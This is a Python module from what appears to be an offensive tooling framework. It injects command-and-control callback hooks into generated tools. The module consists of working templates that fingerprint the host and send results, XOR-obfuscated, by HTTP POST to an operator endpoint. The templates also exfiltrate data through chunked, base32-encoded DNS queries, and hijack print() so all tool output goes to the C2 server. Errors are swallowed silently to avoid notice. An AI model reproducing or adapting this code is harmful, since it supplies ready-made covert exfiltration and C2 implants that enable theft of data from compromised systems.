"""Callback Injector — add C2 reporting hooks to generated tools.

Wraps generated code with callback infrastructure so tools report
results back to the operator in real-time. Three transport modes:
  1. HTTP POST (default) — POST JSON to callback_url
  2. DNS exfil — encode data in DNS queries
  3. File drop — write results to local file (air-gapped)

Pipeline step in forge_live.py — runs AFTER OPSEC hardening, BEFORE audit.

Usage:
    from o1o_o.core.callback_injector import CallbackInjector
    ci = CallbackInjector()
    hooked = ci.inject(code, config={'callback_url': 'http://10.0.0.1:8443/cb'})
"""
# Dependencies: none
# Depended by: forge_live.py pipeline

import re
import textwrap
from typing import Optional


# ── Callback Transport Templates ─────────────────────────────────────

_HTTP_CALLBACK = '''
import json as _json, urllib.request as _urllib_req, time as _time, random as _random
import platform as _platform, os as _os, hashlib as _hashlib

_CB_URL = "{callback_url}"
_CB_KEY = {callback_key}
_CB_TOOL_ID = "{tool_id}"

def _xor_encrypt(data, key):
    """Simple XOR encryption for callback payloads."""
    if not key:
        return data
    kb = key.encode() if isinstance(key, str) else key
    db = data.encode() if isinstance(data, str) else data
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(db))

def _host_fingerprint():
    """Minimal host fingerprint for C2 correlation."""
    try:
        info = f"{{_platform.node()}}|{{_platform.system()}}|{{_os.getuid() if hasattr(_os, 'getuid') else 0}}"
        return _hashlib.md5(info.encode()).hexdigest()[:12]
    except Exception:
        return "unknown"

def _callback(data, output_type="result"):
    """Send data to operator C2 endpoint."""
    try:
        payload = _json.dumps({{
            "tool_id": _CB_TOOL_ID,
            "ts": int(_time.time()),
            "type": output_type,
            "host": _host_fingerprint(),
            "data": data if isinstance(data, str) else str(data),
        }})
        body = _xor_encrypt(payload, _CB_KEY) if _CB_KEY else payload.encode()
        req = _urllib_req.Request(
            _CB_URL,
            data=body,
            headers={{"Content-Type": "application/octet-stream", "X-ID": _CB_TOOL_ID}},
            method="POST"
        )
        _urllib_req.urlopen(req, timeout=5)
    except Exception:
        pass  # Silent fail — tool keeps working without callback

def _callback_retry(data, output_type="result", retries=3):
    """Send with jitter-based retry."""
    for attempt in range(retries):
        try:
            _callback(data, output_type)
            return True
        except Exception:
            if attempt < retries - 1:
                _time.sleep(1 + _random.uniform(0, 2))
    return False

# Report tool startup
_callback("started", "lifecycle")
'''

_DNS_CALLBACK = '''
import socket as _dns_sock, base64 as _b64, time as _time, hashlib as _hashlib

_CB_DOMAIN = "{callback_domain}"
_CB_TOOL_ID = "{tool_id}"

def _dns_exfil(data, chunk_size=30):
    """Exfiltrate data via DNS TXT queries."""
    try:
        encoded = _b64.b32encode(data.encode() if isinstance(data, str) else data).decode().lower()
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        session_id = _hashlib.md5(str(_time.time()).encode()).hexdigest()[:6]
        for idx, chunk in enumerate(chunks):
            query = f"{{session_id}}.{{idx}}.{{chunk}}.{{_CB_DOMAIN}}"
            try:
                _dns_sock.getaddrinfo(query, None)
            except Exception:
                pass
            _time.sleep(0.1)
    except Exception:
        pass

def _callback(data, output_type="result"):
    """DNS exfil callback."""
    _dns_exfil(f"{{output_type}}:{{data}}")
'''

_FILE_CALLBACK = '''
import json as _json, time as _time, os as _os

_CB_FILE = "{callback_file}"
_CB_TOOL_ID = "{tool_id}"

def _callback(data, output_type="result"):
    """Write results to local file (air-gapped mode)."""
    try:
        entry = _json.dumps({{
            "tool_id": _CB_TOOL_ID,
            "ts": int(_time.time()),
            "type": output_type,
            "data": data if isinstance(data, str) else str(data),
        }})
        with open(_CB_FILE, "a") as f:
            f.write(entry + "\\n")
    except Exception:
        pass
'''

_PRINT_HOOK = '''
# Hook print() to also send via callback
_original_print = print
def print(*args, **kwargs):
    _original_print(*args, **kwargs)
    try:
        msg = " ".join(str(a) for a in args)
        if msg.strip():
            _callback(msg, "output")
    except Exception:
        pass
'''

_EXIT_HOOK = '''
import atexit as _cb_atexit
_cb_atexit.register(lambda: _callback("finished", "lifecycle"))
'''


class CallbackInjector:
    """Inject C2 callback hooks into generated code."""

    def inject(self, code: str, config: Optional[dict] = None) -> str:
        """
        Inject callback hooks into generated code.

        Config keys:
            callback_url: HTTP endpoint for callbacks (triggers HTTP mode)
            callback_domain: DNS domain for exfil (triggers DNS mode)
            callback_file: Local file path (triggers file mode)
            callback_key: XOR encryption key for payloads
            tool_id: Unique tool identifier (auto-generated if missing)

        Returns:
            Code with callback hooks injected, or original if no callback configured.
        """
        if not config or not code or not code.strip():
            return code

        callback_url = config.get("callback_url", "")
        callback_domain = config.get("callback_domain", "")
        callback_file = config.get("callback_file", "")

        if not callback_url and not callback_domain and not callback_file:
            return code

        # Generate tool ID
        import hashlib as _hl, time as _t
        tool_id = config.get("tool_id", _hl.md5(f"{_t.time()}".encode()).hexdigest()[:8])
        callback_key = config.get("callback_key")

        # Select transport template
        if callback_url:
            transport = _HTTP_CALLBACK.format(
                callback_url=callback_url,
                callback_key=repr(callback_key) if callback_key else "None",
                tool_id=tool_id,
            )
        elif callback_domain:
            transport = _DNS_CALLBACK.format(
                callback_domain=callback_domain,
                tool_id=tool_id,
            )
        else:
            transport = _FILE_CALLBACK.format(
                callback_file=callback_file,
                tool_id=tool_id,
            )

        # Build injection block
        parts = [textwrap.dedent(transport).strip()]

        # Hook print() if code uses it
        if re.search(r'\bprint\s*\(', code):
            parts.append(textwrap.dedent(_PRINT_HOOK).strip())

        # Add exit lifecycle callback
        parts.append(textwrap.dedent(_EXIT_HOOK).strip())

        preamble = '\n# ── C2 Callback ──\n' + '\n'.join(parts) + '\n# ── End C2 Callback ──\n'

        # Insert after shebang, docstring, and any OPSEC preamble
        lines = code.split('\n')
        insert_at = 0

        # Skip shebang
        if lines and lines[0].startswith('#!'):
            insert_at = 1

        # Skip past OPSEC preamble if present
        for i, line in enumerate(lines[insert_at:], insert_at):
            if '# ── End OPSEC ──' in line:
                insert_at = i + 1
                break

        before = '\n'.join(lines[:insert_at])
        after = '\n'.join(lines[insert_at:])

        return (before + '\n' + preamble + '\n' + after).lstrip('\n')

    def get_report(self, config: Optional[dict] = None) -> dict:
        """Return summary of callback configuration."""
        if not config:
            return {"mode": "none", "configured": False}

        if config.get("callback_url"):
            mode = "http"
            target = config["callback_url"]
        elif config.get("callback_domain"):
            mode = "dns"
            target = config["callback_domain"]
        elif config.get("callback_file"):
            mode = "file"
            target = config["callback_file"]
        else:
            return {"mode": "none", "configured": False}

        return {
            "mode": mode,
            "target": target,
            "encrypted": bool(config.get("callback_key")),
            "configured": True,
        }
